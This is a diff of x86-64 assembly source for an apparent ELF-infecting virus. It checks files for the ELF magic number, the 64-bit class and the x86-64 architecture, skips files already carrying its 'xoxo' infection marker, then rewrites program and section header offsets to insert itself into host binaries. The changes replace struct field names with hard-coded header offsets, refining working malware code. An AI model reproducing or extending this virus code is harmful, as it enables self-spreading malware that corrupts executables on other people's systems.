@@ -663,7 +663,8 @@ check_file:
 		;lea r13, checkelffail
 		;mov r12, checkelffaillen
 		
-		cmp dword [rax + elf_ehdr.e_ident], 0x464c457f
+		;cmp dword [rax + elf_ehdr.e_ident], 0x464c457f
+		cmp dword [rax], 0x464c457f			;elf_ehdr.e_ident
 		jnz checknext
 		
 		;debug print check
@@ -675,7 +676,8 @@ check_file:
 		;debug print check
 		;lea r13, check64fail
 		;mov r12, check64faillen
-		cmp byte [rax + elf_ehdr.e_ident+4], ELFCLASS64
+		;cmp byte [rax + elf_ehdr.e_ident+4], ELFCLASS64
+		cmp byte [rax + 4], ELFCLASS64
 		jne checknext
 		
 		;debug print check
@@ -688,7 +690,8 @@ check_file:
 		;lea r13, checkarchfail
 		;mov r12, checkarchfaillen
 		;cmp byte [r14+800+elf_ehdr + 18], ELFX8664
-		cmp byte [rax + elf_ehdr.e_machine], 0x3e
+		;cmp byte [rax + elf_ehdr.e_machine], 0x3e
+		cmp byte [rax + 18], 0x3e			;elf_ehdr.e_machine
 		jne checknext
 		
 		;debug print check
@@ -697,8 +700,8 @@ check_file:
 		;call _write
 		
 	verifie_pas_de_vx_sig:
-		lea r13, [rax + elf_ehdr.e_entry + 2]
-		cmp dword [r13], 0x786f786f
+		lea r13, [rax + elf_ehdr.e_entry]
+		cmp dword [r13 + 2], 0x786f786f
 		je checknext
 	
 	verifie_deja_infecte:
@@ -720,14 +723,12 @@ check_file:
 		;call _write
 		
 		mov rdi, fd
-		;mov rsi, [r14 + filestat.st_size]
-		mov rsi, [r14 + 48] 	;filestat.st_size
+		mov rsi, [r14 + 48] 			;filestat.st_size
 		mov rax, SYS_MUNMAP
 		syscall
 		
 		pop rcx
-		;add cx, [rcx + r14 + 600 + linuxdirent.d_reclen]
-		add cx, [rcx + r14 + 616]
+		add cx, [rcx + r14 + 616] 		; linuxdirent.d_reclen
 		cmp qword rcx, [r14 + 500]
 		jne check_file
 		jmp _restore
@@ -786,7 +787,6 @@ payload:
 	
 	jmp _restore
 
-;jmp frankenstein_elf		
 ;****************************************************************************************
 ;	Infection routine:
 ;
@@ -816,12 +816,16 @@ payload:
 ;****************************************************************************************
 
 infect:
-	mov r13, [r14+ 800]				;location on stack where we saved address returned from mmap syscall
-	mov r12, [r13 + elf_ehdr.e_phoff]		;address of host ELF Program Header Table in r12
-	mov r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
-	mov r8, [r13 + elf_ehdr.e_entry] 	;address of host ELF entry point in r8
+	mov r13, [r14+ 800]					;location on stack where we saved address returned from mmap syscall
+	;mov r12, [r13 + elf_ehdr.e_phoff]	;address of host ELF Program Header Table in r12
+	mov r12, [r13 + 32]					;address of host ELF Program Header Table in r12
+	;mov r15, [r13 + elf_ehdr.e_shoff] 	;address of host ELF Section Header Table in r15
+	mov r15, [r13 + 40] 				;address of host ELF Section Header Table in r15
+	;mov r8, [r13 + elf_ehdr.e_entry] 	;address of host ELF entry point in r8
+	mov r8, [r13 + 24] 	;address of host ELF entry point in r8
 
-	mov dword [r13 + elf_ehdr.ei_padding], 0x786f786f		;infection marker string "xoxo" in elf_ehdr.e_padding
+	;mov dword [r13 + elf_ehdr.ei_padding], 0x786f786f		;infection marker string "xoxo" in elf_ehdr.e_padding
+	mov dword [r13 + 9], 0x786f786f		;infection marker string "xoxo" in elf_ehdr.e_padding
 	
 	;mov rdx, checkphdrstartlen
 	;lea rsi, checkphdrstart
@@ -847,7 +851,8 @@ infect:
 ;****************************************************************************************
 	xor rcx, rcx
 	xor r11, r11
-	mov word cx, [r13 + elf_ehdr.e_phnum]
+	;mov word cx, [r13 + elf_ehdr.e_phnum]
+	mov word cx, [r13 + 56]			;elf_ehdr.e_phnum
 	check_phdrs:
 		.phdr_loop:
 			cmp word [r13 + r12 + elf_phdr.p_type], PT_LOAD			
@@ -898,7 +903,8 @@ infect:
 				mov dword [r13 + r12 + elf_phdr.p_offset], r11d
 		.next_phdr:
 			dec cx 
-			add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
+			;add r12w, word [r13 + elf_ehdr.e_phentsize] ;add elf_ehdr.e_phentsize to phdr offset in r12 
+			add r12w, word [r13 + 54] 					 ;add elf_ehdr.e_phentsize to phdr offset in r12 
 			cmp cx, 0
 			jg .phdr_loop
 	mov dword [hostentry_offset], r12d
@@ -909,7 +915,8 @@ infect:
 	xor r10, r10
 	xor r11, r11
 	xor rcx, rcx
-	mov word cx, [r13 + elf_ehdr.e_shnum]
+	;mov word cx, [r13 + elf_ehdr.e_shnum]
+	mov word cx, [r13 + 60]											; elf_ehdr.e_shnum
 
 	check_shdrs:
 		.shdr_loop:
@@ -929,7 +936,8 @@ infect:
 				mov dword [r13 + r15 + elf_shdr.sh_offset], r11d
 		.next_shdr:
 			dec cx 
-			add r15w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_shentsize to shdr offset in r15 
+			;add r15w, word [r13 + elf_ehdr.e_shentsize] ;add elf_ehdr.e_shentsize to shdr offset in r15 
+			add r15w, word [r13 + 58] 				; add elf_ehdr.e_shentsize to shdr offset in r15 
 			cmp cx, 0
 			jg .shdr_loop
 	mov r11, [r13 + elf_ehdr.e_shoff]
